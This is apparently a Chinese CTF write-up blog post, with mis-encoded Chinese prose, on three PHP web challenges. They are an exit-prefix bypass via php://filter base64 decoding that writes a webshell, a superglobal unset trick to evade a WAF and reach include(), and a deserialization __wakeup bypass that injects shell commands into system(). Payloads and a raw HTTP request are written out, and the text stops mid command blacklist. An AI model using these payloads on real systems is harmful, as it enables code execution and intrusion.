      <content type="html"><![CDATA[<p>æœ¬äººæ¸£æ¸£ï¼Œäºæ˜¯è®°å½•ä¸€ä¸‹</p><a id="more"></a><h2 id="æ­»äº¡é€€å‡º"><a href="#æ­»äº¡é€€å‡º" class="headerlink" title="æ­»äº¡é€€å‡º"></a>æ­»äº¡é€€å‡º</h2><p>ä¸€é“ä»£ç å®¡è®¡é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];</span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); </span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥çœ‹çœ‹ä»£ç ï¼Œ@æ˜¯ç”¨æ¥å¿½ç•¥é”™è¯¯<br>è¿™æ®µä»£ç æ˜¯åˆ©ç”¨æœ€åçš„includeæ‰§è¡Œtemp.php,é‚£ä¹ˆæˆ‘ä»¬å¾ˆå¿«ä¹å½¢é“è¿ç”¨ä¼ªåè®®æŠŠå®ƒç»™è¯»å‡ºæ¥ã€‚ã€‚ä½†å‰ææ˜¯è¦ç»•è¿‡<code>&quot;&lt;?php exit;?&gt;&quot;</code>;ä¸ç„¶ä¼šç›´æ¥é€€å‡º</p><p>è¿™é‡Œæœåˆ°ä¸€ç¯‡æ–‡ç« ç”¨base64ç»•è¿‡çš„ä¸€ç¯‡æ–‡ç« <br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>è¿™ä¸€é¢˜æˆ‘æœ¬æ¥æ˜¯æƒ³ç”¨<code>print_r(&#39;flag.php&#39;)</code>æ„é€ çš„ï¼Œå‘ç°ä¸è¡Œï¼ŒæŸ¥äº†æŸ¥æ‰‹å†Œå‘ç°æ˜¯è‡ªå·±ç†è§£å‡½æ•°æœ‰é—®é¢˜<br>äºæ˜¯å‚è€ƒäº†æ–¹æ–¹åœŸå­¦é•¿çš„æ„é€ ï¼Œæˆ‘ä½¿ç”¨<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br>base64ç¼–ç ä¹‹å<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p><p>ç„¶å    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><p>postå‚æ•°cçš„æ—¶å€™ä¼šåœ¨<code>&lt;?php exit;?&gt;</code>åé¢åŠ ä¸€äº›ä¸œè¥¿<br>æ‰€ä»¥ä¼šå˜æˆè¿™ä¸ªæ ·å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>ç„¶åç»è¿‡base64decodeä¹‹åå°±å˜æˆäº†ä¸‹é¢çš„é‚£ä¸ªæ ·å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^?Z<span class="meta">&lt;?php</span> system(<span class="string">'cat flag.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æˆ‘çš„base64ä¸ºä»€ä¹ˆå‰é¢å¤šäº†ä¸ªaï¼Œé‚£æ˜¯å› ä¸º<br>åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦<code>&lt;ã€?ã€;ã€&gt;ã€</code>ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œ<code>phpexit</code>â€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚<br>è€Œphpexitä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚</p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæœ€è¿‘ç”¨bpå‘åŒ…éƒ½æä¸äº†è¿™é¢˜ï¼Œæˆ‘æ˜¯ç”¨ç«ç‹è‡ªå¸¦Hackbarå‘é€postæ•°æ®æ‰åœ¨æ§åˆ¶å°ä¸‹é¢çœ‹åˆ°çš„flag<br>æˆ‘ä¹Ÿå¾ˆæ˜¯å¥‡æ€ªã€‚ã€‚ã€‚ã€‚ç”¨bpæŠ“ä¸€ä¸‹åŒ…ç”¨å…¶compareråŠŸèƒ½å¯¹æ¯”ä¹‹åå‘ç°æ”¹çš„åŒ…æ²¡å•¥å·®å¼‚ã€‚ã€‚ã€‚ã€‚ä»¥åè¿˜æ˜¯æŠ“åŒ…è¿˜æ˜¯å…ˆè¿‡ä¸€éhackbarå§ã€‚ã€‚emmmm</p><p>æœ€åç»è¿‡Hackbaræˆªçš„åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://d734739a-e2f8-430e-8dc3-796d3187dbc2</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>è¿™é“é¢˜ç›®ä¹Ÿæ˜¯å¤šäºäº†æ–¹æ–¹åœŸå­¦é•¿æŒ‡å¯¼æˆ‘ä»”ç»†çœ‹æ¸…æ¥šè¿™ä¸ªæ¼æ´ï¼Œæœ€åç»ˆäºæ˜ç™½äº†</p><p>è¿™ä¸ªä¸»è¦æ˜¯åˆ©ç”¨äº†Destoon 20140530æœ€æ–°ç‰ˆè¶…å…¨å±€å˜é‡è¦†ç›–å¯¼è‡´çš„å®‰å…¨é—®é¢˜<br>è¿™æ˜¯ç½‘å€:<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">http://www.secevery.com:4321/bugs/wooyun-2014-063895</a></p><p>å¦‚æœ post get cookie è¯·æ±‚ä¸­çš„<code>$$key</code>å’Œ<code>$value</code>ç›¸ç­‰ å°±unsetæ‰<code>$$key</code><br>å¦‚æœæˆ‘ä»¬å‘1.php?x=1æäº¤ä¸€ä¸ªPOSTè¯·æ±‚ å†…å®¹ä¸º<code>_GET[x]=1</code><br>å› ä¸º?x=1 æ‰€ä»¥<code>$_GET</code>å†…å®¹ä¸º <code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code>,ä½†æ˜¯è¿™é‡Œæ²¡ä»€ä¹ˆå…³ç³»ï¼Œå¦‚æœæ²¡ä¼ postå‚æ•°ä¸Šå»çš„è¯ï¼Œéå†åˆ°ç¬¬ä¸€ä¸ªkeyçš„æ—¶å€™å°±ä¼šç¬¦åˆæ­£åˆ™ç»§è€Œæ‰§è¡Œexitã€‚ã€‚ã€‚ã€‚ã€‚è¿™ä¸ªè‡ªå·±å°è¯•</p><p>å¦‚æœä¼ å‚postä¸Šå»çš„è¯ï¼Œå½“å¼€å§‹éå†<code>$_POST</code>çš„æ—¶å€™ <code>$__k</code>æ˜¯<code>_GET[x]</code> æ‰€ä»¥<code>$$__k</code> å°±æ˜¯<code>$_GET[x]</code>ä¹Ÿå°±æ˜¯<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$__v</code>æ˜¯POSTä¸Šæ¥çš„ä¸€ä¸ªæ•°ç»„ å†…å®¹ä¹Ÿæ˜¯<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$$__k == $__v</code>æˆç«‹<br>æ‰€ä»¥ ,æˆ‘ä»¬çš„è¶…å…¨å±€å˜é‡ <code>$_GET</code>å°±è¿™ä¹ˆåä¸½ä¸½çš„è¢«unsetäº†ã€‚ã€‚ã€‚</p><p>æ²¡å…³ç³»ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯ä¸ºäº†ç»•è¿‡getæ—¶å€™åˆ°çš„wafï¼Œç”±äºæˆ‘ä»¬çš„<code>$_GET</code>å·²ç»åœ¨å‰é¢è¢«unsetäº† æ‰€ä»¥å³ä½¿åŠ äº†<code>EXTR_SKIP extract($_GET)</code>ä»ç„¶èƒ½å¤Ÿæ­£å¸¸çš„åˆå§‹åŒ–<br><code>$_GET extract($_GET)</code>çš„å€¼å°±æˆåŠŸç»•è¿‡äº†wafçš„æ£€æŸ¥<br>å¦‚æœå•å•ä¼ å‚postä¸Šå»çš„è¯ï¼Œåªèƒ½å®ä¾‹åŒ–<code>$_POST[_GET[]]</code>,æ‰€ä»¥è¿˜å¾—ä¼ GETå‚æ•°ï¼Œä¸ç„¶åˆ°äº†<code>$_GET extract($_GET)</code>å°±ä¸<br>èƒ½å®ä¾‹åŒ–$GETäº†</p><p>æœ€åæˆ‘ä»¬åªè¦åˆ©ç”¨MD5çš„æ¼æ´è¿˜æœ‰phpä¼ªåè®®å°±èƒ½å¤ŸæŠŠfileè¯»å‡ºæ¥äº†</p><p>è¿™æ˜¯è‡ªå·±åœ¨æœ¬æœºæ­å»ºçš„æµ‹è¯•æºä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $key;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">    <span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CggZRO.png" alt="CggZRO.png"></p><h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><p>ä¸€æ‰“å¼€æ˜¯åƒé¸¡çš„å›¾ç‰‡ã€‚ã€‚è¿˜æœ‰å‡ ä¸ªæŒ‰é’®ï¼Œéƒ½ç‚¹ä¸€ä¸‹è¯•ä¸€è¯•ï¼Œéƒ½æŸ¥çœ‹ä¸€æ³¢æºç <br>å‘ç°åœ¨å­¦æ ¡çš„æŒ‰é’®ä¸‹é¢çš„æºç å‘ç°äº†index.php.bakï¼Œå¥½å®¶ä¼™æºç æ³„éœ²<br>ç‚¹å¼€å‘ç°ä»£ç æ³„éœ²</p><p>å…³é”®ä»£ç æ˜¯ä¸‹é¢è¿™éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($pos===<span class="string">"school"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html"  style="color:white"&gt;å«æˆ‘æ ¡éœ¸~~&lt;/a&gt;&lt;/center&gt;'</span>);</span><br><span class="line">            $pubg=$_GET[<span class="string">'pubg'</span>];</span><br><span class="line">            $p = unserialize($pubg);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°unserializeå‡½æ•°çŒœæƒ³åº”è¯¥æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼ŒåŒæ ·çš„æ‹›å¼å†çœ‹çœ‹é‚£ä¸€ä¸ªclass.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"nothing"</span>;</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"M24"</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str="You got the airdrop";</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bag=<span class="string">"nothing"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;weapon=<span class="string">"kar98K"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$b();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method,$parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $file = explode(<span class="string">"."</span>,$method);</span><br><span class="line">            <span class="keyword">echo</span> $file[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="string">".//class$file[0].php"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//$method.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//win.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;center&gt;You lose&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            waf(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;weapon===<span class="string">'AWM'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Get_air_drops(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°è¿™æ®µä»£ç è¿˜æœ‰ä¸ªwaf.phpï¼Œå†æ¥ä¸€æ¬¡å‘ç°ä¸è¡Œäº†ï¼Œé‚£å°±å…ˆæ„é€ ä¸€æ³¢å§<br>é¦–å…ˆæˆ‘ä»¬å‘ç°systemå‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯åœ¨<code>__call()</code>å‡½æ•°é‡Œé¢ï¼Œæˆ‘ä»¬åº”è¯¥çŸ¥é“<code>__call()</code>å‡½æ•°åº”è¯¥åœ¨ç±»é‡Œé¢è°ƒç”¨ä¸€ä¸ªæœªå®šä¹‰çš„å‡½æ•°çš„æ—¶å€™ä½¿ç”¨<br>è¿™é‡Œæ˜¯åˆ©ç”¨bagå‚æ•°å»å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œæ¯•ç«Ÿåˆ°äº†Get_air_drops()å‡½æ•°é‡Œé¢æˆ‘ä»¬å°±ä¼šè°ƒç”¨ä¸€ä¸ªæ²¡å®šä¹‰çš„å‡½æ•°äº†ï¼Œå› ä¸ºbagå‚æ•°å¯¹äºæˆ‘ä»¬è€Œè¨€æ˜¯å¯æ§çš„<br>è€Œåœ¨è°ƒç”¨__callå‡½æ•°çš„æ—¶å€™ï¼Œmethodå˜é‡å¯¹åº”å°±æ˜¯bagå‚æ•°çš„å€¼äº†ã€‚ã€‚ã€‚ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆæ„é€ ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"//win.php &amp;&amp; whoami &amp;&amp; index"</span>;    <span class="comment">//è¿™é‡Œçš„indexæ˜¯ä¸ºäº†é—­åˆåé¢çš„.php</span></span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br><span class="line">       <span class="keyword">echo</span> urlencode($a);                <span class="comment">//è®°å¾—URLç¼–ç ä¸Šæ¬¡æ ¡èµ›çš„å‘ç°åœ¨è¿˜æ˜¯è®°å¾—çš„ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure><p>ä½ é—®æˆ‘ä¸ºä»€ä¹ˆbagè¦ä»¥win.phpå¼€å¤´ï¼Ÿ<br>çœ‹çœ‹è¿™é‡Œå°±çŸ¥é“äº†ï¼Œè¿™ä¸€å¥è¡¨æ˜è‚¯å®šæœ‰è¿™æ ·çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ç›´æ¥æ„é€ å°±å¥½äº†<br><a href="http://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p><p>è¿™é‡Œçš„$aå‚æ•°å‡ºæ¥çš„æ˜¯ä¸‹é¢çš„ä¸œè¥¿<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<strong>wakeup()å‡½æ•°ï¼Œä»è€Œå¯¼è‡´äº†æ„é€ çš„ç±»é‡Œé¢çš„å˜é‡é‡å®šä¹‰äº†ï¼Œè¿™å°±ä¼šå¯¼è‡´å¤±è´¥äº†<br>æ‰€ä»¥æˆ‘ä»¬è¿˜å¾—ç»•è¿‡</strong>wakeup()å‡½æ•°<br>æ‰€ä»¥æˆ‘ä»¬å°±æ”¹æˆè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>urlencodeä¹‹åå˜æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A28%3A%22%2F%2Fwin.php+%26%26+whoami+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>å‡ºç°äº†<code>Winner Winner,Chicken Dinner&lt;/center&gt;www-data</code><br>è¯æ˜æˆ‘ä»¬æˆåŠŸäº†ï¼Œæ”¹ä¸€ä¸‹è¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; sort waf"</span>;  </span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸€æ®µä»£ç ï¼Œè‡ªå·±æ‹¼æ¥ä¸€ä¸‹å§<br>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">       $black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span 